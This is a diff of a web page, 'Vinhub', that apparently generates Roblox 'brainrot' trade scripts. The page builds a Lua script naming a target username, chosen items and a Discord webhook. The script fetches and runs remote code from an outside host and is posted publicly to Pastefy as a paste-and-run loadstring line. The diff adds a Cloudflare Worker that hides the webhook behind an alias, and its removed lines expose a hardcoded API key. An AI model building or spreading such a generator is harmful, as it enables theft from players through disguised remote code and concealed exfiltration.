@@ -27,7 +27,6 @@
     font-family: 'Rajdhani', sans-serif;
     min-height: 100vh;
     overflow-x: hidden;
-    padding-bottom: 60px;
   }
   body::before {
     content: '';
@@ -45,66 +44,7 @@
     z-index: 1;
     max-width: 920px;
     margin: 0 auto;
-    padding: 2.8rem 1.5rem 2rem;
-  }
-  .console-btn {
-    position: fixed;
-    bottom: 70px;
-    left: 20px;
-    background: rgba(0, 0, 0, 0.7);
-    color: white;
-    border: 1px solid #4c1d95;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 20px;
-    cursor: pointer;
-    transition: all 0.2s;
-    z-index: 1000;
-  }
-  .console-btn:hover {
-    background: #4c1d95;
-    transform: scale(1.1);
-  }
-  #status-bar {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    background: rgba(0, 0, 0, 0.9);
-    color: white;
-    padding: 12px 20px;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 13px;
-    z-index: 1001;
-    display: none;
-    border-top: 1px solid rgba(255, 255, 255, 0.1);
-    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
-  }
-  #status-message {
-    flex-grow: 1;
-    margin-right: 10px;
-  }
-  #close-status {
-    background: none;
-    border: none;
-    color: white;
-    cursor: pointer;
-    font-size: 18px;
-    padding: 0 5px;
-    transition: color 0.2s;
-  }
-  #close-status:hover {
-    color: var(--danger);
-  }
-  .error {
-    color: var(--danger) !important;
-  }
-  .success {
-    color: var(--green) !important;
+    padding: 2.8rem 1.5rem 6rem;
   }
   .badge-og {
     font-size: 10px;
@@ -534,19 +474,11 @@
 </style>
 </head>
 <body>
-<div id="status-bar" style="display: none;">
-  <span id="status-message"></span>
-  <button id="close-status" onclick="document.getElementById('status-bar').style.display = 'none'">×</button>
-</div>
-
 <div class="wrap">
   <header>
     <div class="logo-row"><h1>Vinhub</h1></div>
     <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
-
-  <button class="console-btn" onclick="openConsole()">🔧</button>
-
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
@@ -561,7 +493,6 @@
       </div>
     </div>
   </div>
-
   <div class="panel">
     <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
     <div class="pb">
@@ -573,7 +504,6 @@
       <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
     </div>
   </div>
-
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
     <div class="pb">
@@ -582,7 +512,6 @@
       <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
     </div>
   </div>
-
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
     <div class="pb">
@@ -598,9 +527,7 @@
       </div>
     </div>
   </div>
-
   <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
-
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
@@ -612,11 +539,7 @@
     </div>
   </div>
 </div>
-
 <script>
-const PASTEFY_API_KEY = 'RaSvXzbM12WwkQN8j5EDlvImFwADOAe57sRdjME45WoWr7Ob2BR0X';
-
-// UN SEUL ANIMAL comme demandé
 const ANIMALS = [
   { name: "Strawberry Elephant", rarity: "OG", mps: "750M/s" },
   { name: "Meowl", rarity: "OG", mps: "600M/s" },
@@ -819,105 +742,51 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
+ const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
+
+function generateAlias(length = 8) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let result = '';
+  const randomValues = new Uint8Array(length);
+  crypto.getRandomValues(randomValues);
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(randomValues[i] % chars.length);
+  }
+  return result;
+}
+
+async function publishScriptToPastefy(scriptContent) {
+  try {
+    const response = await fetch('https://api.pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: scriptContent,
+        title: 'Vinhub Script',
+        language: 'lua',
+        expires: 'never',
+        private: false,
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Pastefy API error: ${response.status}`);
+    }
+
+    const data = await response.json();
+    return data.link;
+  } catch (error) {
+    console.error('Erreur lors de la publication sur Pastefy:', error);
+    return null;
+  }
+}
 
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
 
-// Fonction pour afficher les messages de statut
-function showStatus(message, isError = false) {
-  const statusBar = document.getElementById('status-bar');
-  const statusMessage = document.getElementById('status-message');
-
-  statusMessage.textContent = message;
-  statusMessage.className = isError ? 'error' : 'success';
-  statusBar.style.display = 'flex';
-
-  if (!isError) {
-    setTimeout(() => {
-      statusBar.style.display = 'none';
-    }, 5000);
-  }
-}
-
-// Ouvre la console du navigateur
-function openConsole() {
-  showStatus("Console ouverte. Utilise F12 ou Ctrl+Shift+I pour voir les logs.", false);
-}
-
-// Fonction pour publier sur Pastefy avec gestion d'erreur améliorée
-async function publishScriptToPastefy(scriptContent) {
-  try {
-    showStatus("Publication en cours sur Pastefy...", false);
-
-    // Vérification de la connexion internet
-    if (!navigator.onLine) {
-      throw new Error("Pas de connexion internet. Vérifie ta connexion.");
-    }
-
-    // Nettoyage du script
-    const cleanScript = scriptContent
-      .replace(/\\/g, '\\\\')
-      .replace(/"/g, '\\"')
-      .replace(/\n/g, '\\n')
-      .replace(/\t/g, '\\t');
-
-    // Test de connexion à l'API
-    try {
-      const testResponse = await fetch('https://api.pastefy.app/api/v2/paste', {
-        method: 'HEAD',
-        headers: {
-          'Authorization': `Bearer ${PASTEFY_API_KEY}`
-        }
-      });
-
-      if (!testResponse.ok) {
-        throw new Error("Impossible de contacter l'API Pastefy. Le service est peut-être indisponible.");
-      }
-    } catch (testError) {
-      throw new Error("Impossible de contacter l'API Pastefy. Vérifie ta connexion ou réessaye plus tard.");
-    }
-
-    // Envoi du script
-    const response = await fetch('https://api.pastefy.app/api/v2/paste', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${PASTEFY_API_KEY}`
-      },
-      body: JSON.stringify({
-        content: cleanScript,
-        title: 'Vinhub Script',
-        language: 'lua',
-        expires: '1week',
-        private: false,
-      })
-    });
-
-    const responseText = await response.text();
-
-    if (!response.ok) {
-      let errorMsg = `Erreur Pastefy: ${response.status}`;
-      try {
-        const errorData = JSON.parse(responseText);
-        errorMsg += ` - ${errorData.message || 'Erreur inconnue'}`;
-      } catch (e) {
-        errorMsg += ` - ${responseText}`;
-      }
-      throw new Error(errorMsg);
-    }
-
-    const data = JSON.parse(responseText);
-    showStatus(`Succès! Script publié: ${data.link}`, false);
-    return data.link;
-
-  } catch (error) {
-    showStatus(`Erreur: ${error.message}`, true);
-    return null;
-  }
-}
-
-// Fonction pour définir le mode admin
 function setAdminMode(mode) {
   adminMode = mode;
   const buttons = document.querySelectorAll('.admin-mode-btn');
@@ -932,12 +801,10 @@ function setAdminMode(mode) {
   }
 }
 
-// Met à jour le loadstring personnalisé
 function updateCustomAdmin() {
   customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
 
-// Recherche d'utilisateurs Roblox
 async function searchRobloxUsers(query) {
   if (query.length < 3) return [];
 
@@ -952,12 +819,11 @@ async function searchRobloxUsers(query) {
     const data = await response.json();
     return data.data || [];
   } catch (error) {
-    showStatus(`Erreur lors de la recherche Roblox: ${error.message}`, true);
+    console.error("Erreur lors de la recherche Roblox :", error);
     return [];
   }
 }
 
-// Affiche les suggestions d'utilisateurs
 function showSuggestions(users) {
   const suggestionsContainer = document.getElementById('usernameSuggestions');
   suggestionsContainer.innerHTML = '';
@@ -1001,7 +867,6 @@ function showSuggestions(users) {
   suggestionsContainer.style.display = 'block';
 }
 
-// Fermeture des suggestions en cliquant ailleurs
 document.addEventListener('click', function(e) {
   const suggestionsContainer = document.getElementById('usernameSuggestions');
   const usernameInput = document.getElementById('usernameInput');
@@ -1010,7 +875,6 @@ document.addEventListener('click', function(e) {
   }
 });
 
-// Fonction de debounce pour la recherche
 function debounce(func, delay) {
   let timeoutId;
   return function(...args) {
@@ -1019,7 +883,6 @@ function debounce(func, delay) {
   };
 }
 
-// Recherche d'utilisateurs avec debounce
 document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
   const query = e.target.value.trim();
   if (query.length === 0) {
@@ -1031,7 +894,6 @@ document.getElementById('usernameInput').addEventListener('input', debounce(asyn
   showSuggestions(users);
 }, 300));
 
-// Affiche la liste des animaux
 function renderList(filter) {
   const q = (filter || '').toLowerCase();
   const list = document.getElementById('animalList');
@@ -1067,22 +929,15 @@ function renderList(filter) {
   document.getElementById('selNum').textContent = selected.size;
 }
 
-// Active/désactive un animal
 function toggle(name) {
   selected.has(name) ? selected.delete(name) : selected.add(name);
   renderList(document.getElementById('searchBox').value);
 }
 
-// Filtre la liste
 function filterList() { renderList(document.getElementById('searchBox').value); }
-
-// Sélectionne tous les animaux
 function selectAll() { ANIMALS.forEach(n => selected.add(n.name)); renderList(document.getElementById('searchBox').value); }
-
-// Désélectionne tous les animaux
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
-// Valide le username
 function validateUsername() {
   const username = document.getElementById('usernameInput').value.trim();
   const hint = document.getElementById('usernameHint');
@@ -1097,7 +952,6 @@ function validateUsername() {
   }
 }
 
-// Valide le webhook
 function validateWebhook() {
   const webhook = document.getElementById('webhookInput').value.trim();
   const hint = document.getElementById('webhookHint');
@@ -1112,13 +966,11 @@ function validateWebhook() {
   }
 }
 
-// Génère le script final
 async function generate() {
   const username = document.getElementById('usernameInput').value.trim();
   const webhook = document.getElementById('webhookInput').value.trim();
   const out = document.getElementById('outputBlock');
 
-  // Validations
   if (selected.size === 0) {
     out.className = 'code-block empty';
     out.textContent = '-- Please select at least one brainrot animal.';
@@ -1135,7 +987,21 @@ async function generate() {
     return;
   }
 
-  // Génération du script
+  const alias = generateAlias();
+  try {
+    const response = await fetch(`${KV_WORKER_URL}/store`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ alias, url: webhook })
+    });
+    if (!response.ok) throw new Error('KV store failed');
+  } catch (error) {
+    console.error(error);
+    out.className = 'code-block empty';
+    out.textContent = '-- Error while saving in Cloudflare KV.';
+    return;
+  }
+
   const names = [...selected];
   const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1150,7 +1016,7 @@ end)
     adminScriptPart = customAdminLoadstring;
   }
 
-  const fullScript = `getgenv().WEBHOOK_URL = "${webhook}"
+  const fullScript = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
@@ -1161,19 +1027,17 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-  out.textContent = "-- Publishing to Pastefy, please wait...";
-  out.className = 'code-block';
-
   const pasteUrl = await publishScriptToPastefy(fullScript);
   if (!pasteUrl) {
-    out.textContent = '-- Failed to publish on Pastefy. Check the status bar for details.';
+    out.className = 'code-block empty';
+    out.textContent = '-- Failed to publish on Pastefy. Please try again later.';
     return;
   }
 
+  out.className = 'code-block';
   out.textContent = `loadstring(game:HttpGet("${pasteUrl}"))()`;
 }
 
-// Copie le script généré
 function copyOut() {
   const code = document.getElementById('outputBlock').textContent;
   if (!code || code.startsWith('--')) return;
@@ -1185,7 +1049,6 @@ function copyOut() {
   });
 }
 
-// Initialisation
 renderList();
 </script>
 </body>
